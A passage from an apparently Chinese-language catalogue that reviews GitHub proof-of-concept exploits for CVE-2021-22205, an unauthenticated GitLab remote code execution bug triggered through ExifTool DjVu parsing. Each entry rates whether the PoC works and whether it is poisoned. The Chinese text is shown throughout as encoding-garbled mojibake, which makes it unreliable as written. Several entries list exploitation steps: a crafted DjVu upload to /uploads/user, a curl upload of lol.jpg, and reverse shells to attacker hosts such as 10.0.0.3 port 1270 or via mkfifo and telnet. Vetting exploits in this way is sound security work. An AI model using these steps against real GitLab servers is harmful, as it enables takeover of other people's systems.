3.  **è¿œç¨‹ä»£ç æ‰§è¡Œï¼š** å½“GitLabæœåŠ¡å™¨å°è¯•å¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶æ—¶ï¼ŒExifToolä¼šæ‰§è¡Œå›¾åƒå…ƒæ•°æ®ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
4.  **OOBï¼ˆå¸¦å¤–ï¼‰éªŒè¯ï¼š**  POCä»£ç åˆå§‹åŒ–äº†DNSLogï¼ŒRequestBinç­‰æœåŠ¡ï¼Œç”¨äºŽéªŒè¯æ¼æ´žã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡DNSæŸ¥è¯¢æˆ–è€…HTTPè¯·æ±‚çš„æ–¹å¼æ¥ç¡®å®šå‘½ä»¤æ˜¯å¦æˆåŠŸæ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [inspiringz/CVE-2021-22205](https://github.com/inspiringz/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #16

**æ¥æº**: [CVE-2021-22205-keven1z_CVE-2021-22205.md](../2021/CVE-2021-22205-keven1z_CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯å¯¼è‡´å®Œå…¨ç³»ç»ŸæŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œç›®æ ‡GitLabå®žä¾‹å¯ä»Žç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 10%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå½±å“ GitLab CE/EE çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žå­˜åœ¨äºŽå›¾åƒæ–‡ä»¶è§£æžè¿‡ç¨‹ä¸­ï¼Œç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´å¯ä»¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„ POC ä»£ç æœ‰æ•ˆã€‚å®ƒåˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„ DJVU å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
POC ä»£ç ä¸­å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£Žé™©ã€‚é£Žé™©ä¸º10%ã€‚

ä»¥ä¸‹æ˜¯å¯¹ä»£ç ä¸­å¯èƒ½å­˜åœ¨çš„æŠ•æ¯’é£Žé™©ç‚¹çš„åˆ†æžï¼š

*   **ç¡¬ç¼–ç çš„User-Agent:**  POC ä½¿ç”¨äº† `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36`ã€‚è¿™å¯èƒ½æ˜¯ä¸ºäº†ç»•è¿‡æŸäº›ç®€å•çš„ WAF è§„åˆ™ï¼Œä½†ä¹Ÿå¯èƒ½å¯¼è‡´æŒ‡çº¹è¯†åˆ«ï¼Œä»Žè€Œä½¿æ”»å‡»æ›´å®¹æ˜“è¢«æ£€æµ‹ã€‚è™½ç„¶ä¸ç®—æ¶æ„ï¼Œä½†ä¸å¤Ÿçµæ´»ï¼Œå¯èƒ½å½±å“åˆ©ç”¨æ•ˆæžœã€‚
*   **Payloadå®šæ­»ï¼Œç¼ºå°‘éšæœºæ€§ï¼š**POCä¸­ç”¨äºŽè§¦å‘æ¼æ´žçš„DJVUæ–‡ä»¶å†…å®¹ç›¸å¯¹å›ºå®šã€‚è™½ç„¶ä¿®æ”¹äº†commandéƒ¨åˆ†,ä½†æ˜¯å¦‚æžœç›®æ ‡ç³»ç»Ÿå¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œæ›´ä¸¥æ ¼çš„æ ¡éªŒï¼Œè¿™ç§å›ºå®šçš„Payloadå¯èƒ½ä¼šå¯¼è‡´åˆ©ç”¨å¤±è´¥ã€‚å¦‚æžœpayloadåŠ å…¥éšæœºåŒ–,å¯¹æ”»å‡»æ›´åŠ æœ‰åˆ©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆå‘é€ä¸€ä¸ª GET è¯·æ±‚åˆ° `/users/sign_in` èŽ·å– CSRF tokenã€‚è¯¥tokenç”¨äºŽåŽç»­çš„postè¯·æ±‚çš„è®¤è¯ã€‚
2.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚è¯¥å›¾åƒæ–‡ä»¶åœ¨ metadata å­—æ®µä¸­åµŒå…¥æ¶æ„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…æž„é€ ä¸€ä¸ª multipart/form-data è¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä½œä¸ºæ–‡ä»¶ä¸Šä¼ åˆ° `/uploads/user` è·¯å¾„ã€‚
4.  å½“ GitLab å¤„ç†ä¸Šä¼ çš„å›¾åƒæ—¶ï¼ŒExifTool ä¼šè¢«è°ƒç”¨æ¥æå–å›¾åƒå…ƒæ•°æ®ã€‚ç”±äºŽå›¾åƒæ–‡ä»¶ä¸­çš„æ¶æ„å‘½ä»¤ï¼ŒExifTool ä¼šæ‰§è¡Œè¿™äº›å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  åˆ©ç”¨ä»£ç ä¸­ï¼Œcommandå˜é‡å¯ä»¥å®šä¹‰åå¼¹shellæˆ–è€…æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [keven1z/CVE-2021-22205](https://github.com/keven1z/CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #17

**æ¥æº**: [CVE-2021-22205-momika233_cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-.md](../2021/CVE-2021-22205-momika233_cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** å¯ä»Žç½‘ç»œè®¿é—®å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ï¼Œä¸”å®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ç‰ˆæœ¬ä¸­å­˜åœ¨çš„ä¸€ä¸ªæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚æ¼æ´žåŽŸå› æ˜¯ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼ˆä¾‹å¦‚ï¼ŒDjVuæ–‡ä»¶ï¼‰åˆ©ç”¨ ExifTool ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä¸¤ä¸ªä¸»è¦æ­¥éª¤ï¼š
1.  **ç”ŸæˆPayloadï¼š**  PoC é¦–å…ˆç”Ÿæˆä¸€ä¸ªåä¸º lol.jpg çš„ DjVu å›¾åƒï¼Œè¯¥å›¾åƒåŒ…å«ä¸€ä¸ªåå‘ shell çš„ Payloadã€‚è¯¥Payloadä½¿ç”¨ `base64` ç¼–ç å¹¶æ‹¼æŽ¥shellå‘½ä»¤åˆ°æ–‡ä»¶æœ«å°¾. Payloadå»ºç«‹ä¸Ž `10.0.0.3` ç«¯å£ `1270` çš„åå‘è¿žæŽ¥ï¼Œå¹¶åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œå‘½ä»¤ã€‚
2.  **å‘é€Payloadï¼š**  PoC ä½¿ç”¨ `curl` å‘½ä»¤å°†ç”Ÿæˆçš„ lol.jpg æ–‡ä»¶ä¸Šä¼ åˆ° GitLab å®žä¾‹ã€‚`-F 'file=@lol.jpg'` å‚æ•°å°†æ–‡ä»¶ä½œä¸º POST è¯·æ±‚çš„ä¸€éƒ¨åˆ†å‘é€ã€‚`http://10.0.0.7/$(openssl rand -hex 8)` è¡¨ç¤ºæ”»å‡»è€…å¯ä»¥é€šè¿‡ä»»æ„ endpoint è§¦å‘è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
é€šè¿‡åˆ†æžPoCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’è¿¹è±¡ã€‚è¯¥ä»£ç æ—¨åœ¨ç”Ÿæˆå¹¶ä¸Šä¼ ä¸€ä¸ªåŒ…å«åå‘ shell çš„å›¾åƒæ–‡ä»¶ã€‚æ‰€æœ‰æ“ä½œéƒ½æ˜¯ä¸ºäº†åˆ©ç”¨æ¼æ´žï¼Œå¹¶æ²¡æœ‰æ·»åŠ ä»»ä½•ä¸Žæ¼æ´žåˆ©ç”¨æ— å…³çš„æ¶æ„ä»£ç ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¯„ä¼°ä¸º 0%ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š
1.  æ”»å‡»è€…æž„é€ æ¶æ„çš„DjVuå›¾åƒï¼Œè¯¥å›¾åƒåµŒå…¥äº†å‘½ä»¤æ³¨å…¥Payloadã€‚
2.  æ”»å‡»è€…é€šè¿‡ä¸Šä¼ åŠŸèƒ½ï¼Œå°†æž„é€ çš„å›¾åƒä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ã€‚ç”±äºŽæœªè¿›è¡Œå……åˆ†çš„éªŒè¯ï¼Œä¸Šä¼ è¿‡ç¨‹ä¸ä¼šé˜»æ­¢æ¶æ„å›¾åƒã€‚
3.  GitLabåœ¨å¤„ç†å›¾åƒæ—¶ï¼Œè°ƒç”¨ExifToolç­‰å›¾åƒå¤„ç†å·¥å…·ã€‚
4.  ExifToolè§£æžæ¶æ„å›¾åƒï¼Œæ‰§è¡Œå…¶ä¸­åµŒå…¥çš„æ¶æ„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  æ”»å‡»è€…é€šè¿‡åå‘shellèŽ·å–å¯¹GitLabæœåŠ¡å™¨çš„è®¿é—®æƒé™ï¼Œä»Žè€Œå®žçŽ°å¯¹ç³»ç»Ÿçš„æŽ§åˆ¶ã€‚

**é¡¹ç›®åœ°å€:** [momika233/cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-](https://github.com/momika233/cve-2021-22205-GitLab-13.10.2---Remote-Code-Execution-RCE-Unauthenticated-)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #18

**æ¥æº**: [CVE-2021-22205-mr-r3bot_Gitlab-CVE-2021-22205.md](../2021/CVE-2021-22205-mr-r3bot_Gitlab-CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´å®Œå…¨æŽ§åˆ¶æœåŠ¡å™¨

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** éœ€è¦ç›®æ ‡GitLabå®žä¾‹è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬ï¼Œå¹¶ä¸”èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

è¯¥æ¼æ´žå­˜åœ¨äºŽGitLabä¸­ï¼Œç”±äºŽExifToolåœ¨å¤„ç†å›¾åƒæ–‡ä»¶æ—¶æœªæ­£ç¡®éªŒè¯ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶è§¦å‘æ¼æ´žã€‚å…·ä½“æ¥è¯´ï¼ŒGitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒï¼Œè€ŒExifToolåœ¨å¤„ç†DjVuæ ¼å¼æ–‡ä»¶æ—¶ï¼Œå­˜åœ¨ä»£ç æ³¨å…¥æ¼æ´žã€‚æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„ä»£ç çš„DjVuæ–‡ä»¶ï¼Œå°†å…¶ä¸Šä¼ è‡³GitLabï¼Œå½“GitLabå°è¯•è§£æžè¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„ä»£ç å°†è¢«æ‰§è¡Œï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç åˆ©ç”¨äº†CVE-2021-22205æ¼æ´žï¼Œç»éªŒè¯æœ‰æ•ˆã€‚å®ƒé€šè¿‡åˆ›å»ºåŒ…å«æ¶æ„å…ƒæ•°æ®çš„DjVuå›¾åƒæ–‡ä»¶ï¼Œç„¶åŽå°†å…¶ä¸Šä¼ åˆ°GitLabå®žä¾‹ã€‚å½“GitLabå¤„ç†è¯¥å›¾åƒæ—¶ï¼ŒExifToolä¼šæ‰§è¡ŒåµŒå…¥åœ¨å…ƒæ•°æ®ä¸­çš„å‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**
åˆ†æžæä¾›çš„POCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°ä»»ä½•éšè—çš„æŠ•æ¯’ä»£ç ã€‚è¯¥ä»£ç çš„åŠŸèƒ½æ˜Žç¡®ï¼Œå³åˆ©ç”¨CVE-2021-22205æ¼æ´žæ‰§è¡Œå‘½ä»¤ã€‚æ‰€æœ‰æ“ä½œéƒ½åœ¨è„šæœ¬ä¸­æ¸…æ™°å¯è§ï¼Œæ²¡æœ‰æ··æ·†æˆ–éšè—è¡Œä¸ºã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦èŽ·å–ç›®æ ‡GitLabå®žä¾‹çš„URLã€‚
2.  ç„¶åŽï¼Œæ”»å‡»è€…ä½¿ç”¨POCè„šæœ¬ç”Ÿæˆä¸€ä¸ªåŒ…å«æ¶æ„DjVuå…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
3.  è„šæœ¬ä½¿ç”¨`djvumake`å‘½ä»¤åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„payloadçš„`rce.djvu`æ–‡ä»¶ï¼Œå†å°†å…¶é‡å‘½åä¸º`rce.jpg`ã€‚
4.  POCä»£ç é€šè¿‡æ¨¡æ‹Ÿæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œå°†ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°GitLabå®žä¾‹ã€‚
5.  GitLabæŽ¥æ”¶åˆ°æ–‡ä»¶åŽï¼Œä¼šè°ƒç”¨ExifToolè¿›è¡Œå¤„ç†ï¼Œç”±äºŽExifToolå­˜åœ¨æ¼æ´žï¼Œå¯¼è‡´æ‰§è¡Œå›¾åƒæ–‡ä»¶ä¸­åµŒå…¥çš„æ¶æ„ä»£ç ã€‚
6.  æ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤å°†åœ¨GitLabæœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œä»Žè€Œå®žçŽ°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [mr-r3bot/Gitlab-CVE-2021-22205](https://github.com/mr-r3bot/Gitlab-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #19

**æ¥æº**: [CVE-2021-22205-osungjinwoo_CVE-2021-22205-gitlab.md](../2021/CVE-2021-22205-osungjinwoo_CVE-2021-22205-gitlab.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8, >=13.9, <13.9.6, >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œéœ€è¦ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 5%

## è¯¦æƒ…

CVE-2021-22205æ˜¯GitLabä¸­çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽGitLabæ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¶æ„ExifToolå‘½ä»¤æ³¨å…¥ä»£ç ï¼Œå½“GitLabå°è¯•å¤„ç†è¯¥å›¾åƒæ—¶ï¼ŒExifToolä¼šæ‰§è¡Œæ”»å‡»è€…æ³¨å…¥çš„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæä¾›çš„POCä»£ç ï¼Œæ­¤æ¼æ´žåˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯ä¸­CVSSè¯„åˆ†ä¸º10ï¼Œå±žäºŽä¸¥é‡çº§åˆ«ï¼Œå¹¶ä¸”CISA KEVç›®å½•ä¹Ÿæ”¶å½•äº†è¯¥æ¼æ´žï¼Œè¯´æ˜Žå­˜åœ¨è¢«åˆ©ç”¨çš„æƒ…å†µã€‚POCä»£ç å®žçŽ°äº†æœªæŽˆæƒæƒ…å†µä¸‹çš„RCEï¼Œåˆ©ç”¨äº†ä¸Šä¼ åŠŸèƒ½å’ŒExifToolçš„å‘½ä»¤æ³¨å…¥ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç æœ¬èº«çš„åŠŸèƒ½æ˜¯å®žçŽ°æ¼æ´žåˆ©ç”¨ï¼Œå¹¶æ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚é£Žé™©è¯„ä¼°ä¸º5%ï¼Œè¾ƒä½Žã€‚

*   ä»£ç ç»“æž„æ¸…æ™°ï¼Œä¸»è¦åŠŸèƒ½ä¸ºæž„é€ æ¶æ„å›¾åƒä¸Šä¼ å¹¶æ‰§è¡Œå‘½ä»¤ã€‚
*   ä»£ç ä¸­å­˜åœ¨ä¸ŽDNSlogäº¤äº’çš„éƒ¨åˆ†ï¼Œå¯ä»¥éªŒè¯å‘½ä»¤æ‰§è¡Œï¼Œä½†ä¹Ÿå¯èƒ½è¢«æ»¥ç”¨ã€‚
*   æ€»ä½“è€Œè¨€ï¼Œä»£ç åŠŸèƒ½é›†ä¸­äºŽæ¼æ´žåˆ©ç”¨æœ¬èº«ï¼Œæ²¡æœ‰å‘çŽ°é¢å¤–æ¶æ„è¡Œä¸ºã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…é¦–å…ˆæ‰¾åˆ°ç›®æ ‡GitLabå®žä¾‹çš„ç™»å½•é¡µé¢ (`/users/sign_in`)ã€‚
2.  ä»Žç™»å½•é¡µé¢çš„HTMLæºä»£ç ä¸­æå–CSRF tokenï¼Œç”¨äºŽåŽç»­çš„POSTè¯·æ±‚ã€‚
3.  æž„é€ ä¸€ä¸ªåŒ…å«æ¶æ„ExifToolå‘½ä»¤çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ï¼ˆå®žé™…ä¸Šæ˜¯DJVUæ–‡ä»¶ï¼‰ã€‚è¯¥æ¶æ„å‘½ä»¤è¢«åµŒå…¥åˆ°å›¾åƒçš„metadataä¸­ã€‚
4.  é€šè¿‡å‘ `/uploads/user` ç«¯ç‚¹å‘é€åŒ…å«æ¶æ„å›¾åƒæ–‡ä»¶çš„multipart/form-data POSTè¯·æ±‚ï¼Œä¸Šä¼ è¯¥å›¾åƒã€‚
5.  GitLabä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ï¼ŒExifToolæ‰§è¡Œå›¾åƒmetadataä¸­çš„æ¶æ„å‘½ä»¤ï¼Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

åˆ©ç”¨ä»£ç ä¸­åŒ…å«ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š

*   æ£€æŸ¥æ¨¡å¼ (`-v true`)ï¼šé€šè¿‡ä¸Šä¼ åŒ…å«ç‰¹å®šDNSlogåŸŸåçš„æ¶æ„å›¾ç‰‡ï¼Œæ£€æŸ¥ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´žã€‚
*   æ”»å‡»æ¨¡å¼ (`-a true`)ï¼šå…è®¸æ”»å‡»è€…æŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ (`-c command`)ï¼Œç›´æŽ¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
*   æ–‡ä»¶æ¨¡å¼ (`-s true`): ä¸Šä¼ æŒ‡å®šæ–‡ä»¶ `-f file`ã€‚

æ€»ç»“ï¼šæ”»å‡»è€…é€šè¿‡ä¸Šä¼ ç²¾å¿ƒæž„é€ çš„æ¶æ„å›¾åƒï¼Œåˆ©ç”¨ExifToolå‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œå®žçŽ°åœ¨ç›®æ ‡GitLabæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**é¡¹ç›®åœ°å€:** [osungjinwoo/CVE-2021-22205-gitlab](https://github.com/osungjinwoo/CVE-2021-22205-gitlab)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #20

**æ¥æº**: [CVE-2021-22205-overgrowncarrot1_DejaVu-CVE-2021-22205.md](../2021/CVE-2021-22205-overgrowncarrot1_DejaVu-CVE-2021-22205.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žä¸”å¯ä»Žç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽ GitLab CE/EE ä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žï¼Œå½±å“ä»Ž 11.9 å¼€å§‹çš„å¤šä¸ªç‰ˆæœ¬ã€‚è¯¥æ¼æ´žæ˜¯ç”±äºŽ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶è€Œå¯¼è‡´çš„ã€‚æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥åˆ©ç”¨æ­¤æ¼æ´žï¼Œä»Žè€Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

**æ¼æ´žåˆ©ç”¨åˆ†æžï¼š**

æä¾›çš„`DejaVu.sh`è„šæœ¬ç”¨äºŽåˆ©ç”¨ CVE-2021-22205ã€‚ä»¥ä¸‹æ˜¯è„šæœ¬çš„å·¥ä½œåŽŸç†ï¼š

1.  **å‚æ•°å¤„ç†ï¼š** è„šæœ¬æŽ¥å— LHOSTï¼ˆæ”»å‡»è€…ç›‘å¬åœ°å€ï¼‰ã€LPORTï¼ˆæ”»å‡»è€…ç›‘å¬ç«¯å£ï¼‰å’Œ WEBHOSTï¼ˆç›®æ ‡ GitLab å®žä¾‹çš„ URLï¼‰ä½œä¸ºå‚æ•°ã€‚
2.  **ç”Ÿæˆæ¶æ„å›¾åƒæ–‡ä»¶ï¼š** è„šæœ¬åˆ›å»ºä¸€ä¸ªåä¸º `lol.jpg` çš„æ¶æ„å›¾åƒæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶çš„å‰é¢éƒ¨åˆ†æ˜¯æœ‰æ•ˆçš„JPEGæ–‡ä»¶ï¼ŒåŽé¢é™„åŠ äº†ç²¾å¿ƒæž„é€ çš„ExifToolå‘½ä»¤æ³¨å…¥æœ‰æ•ˆè½½è·ã€‚
3.  **ExifTool å‘½ä»¤æ³¨å…¥ï¼š** æ¼æ´žçš„æ ¹æºåœ¨äºŽ GitLab ä½¿ç”¨ ExifTool å¤„ç†å›¾åƒå…ƒæ•°æ®æ—¶å­˜åœ¨ç¼ºé™·ã€‚é€šè¿‡åœ¨å›¾åƒå…ƒæ•°æ®ä¸­æ’å…¥æ¶æ„å‘½ä»¤ï¼Œæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚
4.  **åå¼¹ Shellï¼š** è¯¥è„šæœ¬ä½¿ç”¨ `mkfifo` åˆ›å»ºä¸€ä¸ªå‘½åç®¡é“ï¼Œç„¶åŽä½¿ç”¨ `telnet` è¿žæŽ¥åˆ°æ”»å‡»è€…çš„ LHOST å’Œ LPORTï¼Œå¹¶å°† shell çš„è¾“å…¥å’Œè¾“å‡ºé‡å®šå‘åˆ°è¯¥ç®¡é“ã€‚è¿™æœ‰æ•ˆåœ°åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šå»ºç«‹äº†ä¸€ä¸ªåå¼¹ shellã€‚
